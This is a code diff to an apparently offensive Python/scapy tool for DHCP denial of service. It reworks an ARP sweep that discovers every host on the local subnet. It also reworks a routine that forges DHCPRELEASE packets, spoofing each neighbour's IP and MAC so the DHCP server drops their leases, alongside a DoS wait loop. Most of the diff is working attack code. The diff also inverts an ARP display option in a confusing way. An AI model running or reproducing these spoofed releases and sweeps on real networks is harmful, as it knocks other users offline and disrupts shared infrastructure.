@@ -94,7 +94,7 @@ Defaults
 conf.checkIPaddr = False
 conf.iface = "lo"
 conf.verb = False
-SHOW_ARP = False
+SHOW_ARP = True
 SHOW_ICMP = False
 SHOW_DHCPOPTIONS = False
 SHOW_LEASE_CONFIRM = False
@@ -165,7 +165,7 @@ def checkArgs():
             usage()
             sys.exit()
         elif o in ("-a", "--show-arp"):
-            SHOW_ARP = True
+            SHOW_ARP = False
         elif o in ("-i", "--show-icmp"):
             SHOW_ICMP = True
         elif o in ("-o", "--show-options"):
@@ -230,7 +230,7 @@ def checkArgs():
         IPv6                            %s
         fuzz                            %s
 
-        SHOW_ARP                        %s
+        DONT_SHOW_ARP                   %s
         SHOW_ICMP                       %s
         SHOW_DHCPOPTIONS                %s
         SHOW_LEASE_CONFIRMATION         %s
@@ -420,35 +420,15 @@ def neighbors():
     nodes = {}
     if MODE_IPv6:
         LOG(type="WARNING", message="IPv6 - neighbors() not supported at this point ")
-        # ICMPv6 neighbor solicitation - who has fxy
-        return
-        if not p_dhcp_advertise:
-            LOG(type="WARNING", message= "IPv6 - neighbors() - need at least one advertise to do a neighbor scan ")
-            return
-        m = randomMAC()
-        p = v6_build_ether(m)
-        del(p[UDP])                              # dont need UDP
-        # FIXME: use ipaddr to calc subnet
-        # 
-        net = p_dhcp_advertise[DHCP6OptServerId].duid.lladdr    # FIXME: make this fit the advertised net
-        
-        ns = ICMPv6ND_NS(tgt=net, R=0)/ICMPv6NDOptSrcLLAddr(lladdr=m)
-        ans, unans = srp(p/ns/ls, timeout=8, filter="icmp6")         #tune filter to only show neighbor solictaiations
-        for request, reply in ans:
-            nodes[reply.hwsrc] = reply.psrc
-            LOG(type="<--", message="%15s - %s " % (reply.psrc, reply.hwsrc) )
-        
     else:
-        m = randomMAC()
         myip = get_if_ip(conf.iface)
         LOG(type="DEBUG", message="NEIGHBORS:  net = %s  : msk =%s  : CIDR=%s"%(get_if_net(conf.iface),get_if_msk(conf.iface),calcCIDR(get_if_msk(conf.iface))))
         pool = Net(myip + "/" + calcCIDR(get_if_msk(conf.iface)))
         for ip in pool:
-            LOG(type="<--", message="ARP: sending %15s - %s " % (ip, myip))
-            ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip, psrc=myip), timeout=1, filter="arp and arp[7] = 2")
-            for request, reply in ans:
-                nodes[reply.hwsrc] = reply.psrc
-                LOG(type="<--", message="%15s - %s " % (reply.psrc, reply.hwsrc) )
+            LOG(type="<--", message="ARP: sending %s " %ip)
+            arp_request=Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip, psrc=myip)
+            sendPacket(arp_request)
+            time.sleep(0.005)
 
 
 def release():
@@ -464,12 +444,12 @@ def release():
         v6_build_release(p_dhcp_advertise,mac)
     else:
         LOG(type="NOTICE", message= "***  Sending DHCPRELEASE for neighbors ")
-        myxid=random.randint(1, 900000000)
-        #
         #iterate over all nodes and release their IP from DHCP server
         for cmac,cip in nodes.iteritems():
-            dhcp_release = Ether(src=cmac,dst=dhcpsmac)/IP(src=cip,dst=dhcpsip)/UDP(sport=68,dport=67)/BOOTP(ciaddr=cip,chaddr=[mac2str(cmac)],xid=myxid,)/DHCP(options=[("message-type","release"),("server_id",dhcpsip),("client_id",chr(1),mac2str(cmac)),"end"])
-            LOG(type="-->", message= "Releasing %s - %s"%(cmac,cip))
+            myxid = random.randint(1, 900000000)
+            LOG(type="-->", message= "Releasing %s - %s serverip=%s  xid=%i"%(cmac,cip,dhcpsip,myxid))
+            dhcp_release =  IP(src=cip,dst=dhcpsip)/UDP(sport=68,dport=67)/BOOTP(ciaddr=cip,chaddr=[mac2str(cmac)],xid=myxid)/\
+                            DHCP(options=[("message-type","release"),("server_id",dhcpsip),("client_id",chr(1),mac2str(cmac)),"end"])
             sendPacket(dhcp_release)
             if conf.verb: LOG(type="DEBUG", message= "%r"%dhcp_release )
 
@@ -643,10 +623,15 @@ class sniff_dhcp(threading.Thread):
                     sendPacket(icmp_req)
 
             elif SHOW_ARP and ARP in pkt:
+                myip = pkt[ARP].pdst
+                mydst = pkt[ARP].psrc
                 if pkt[ARP].op ==1:        #op=1 who has, 2 is at
-                    myip=pkt[ARP].pdst
-                    mydst=pkt[ARP].psrc
-                    LOG(type="<-", message= "ARP_Request " + myip+" from "+mydst)
+                    LOG(type="DEBUG", message="ARP_Request " + myip + " from " + mydst)
+                elif pkt[ARP].op ==2:
+                    myip=pkt[ARP].psrc
+                    myhw=pkt[ARP].hwsrc
+                    LOG(type="<-", message= "ARP_Response %s : %s" %(myip, myhw))
+                    nodes[myhw] = myip
 
 
 def main():
@@ -674,8 +659,8 @@ def main():
         t=send_dhcp()
         t.start()
         THREAD_POOL.append(t)
-        
-    fail_cnt=100
+
+    fail_cnt=20
     while dhcpsip==None and fail_cnt>0:
         time.sleep(TIMEOUT['dhcpip'])
         LOG(type="?", message= "\t\twaiting for first DHCP Server response")
@@ -686,7 +671,7 @@ def main():
         signal_handler(signal.SIGINT,fail_cnt)
 
     if DO_ARP: neighbors()
-    if DO_RELEASE: release()        
+    if DO_RELEASE: release()
        
     while not dhcpdos:
         time.sleep(TIMEOUT['dos'])
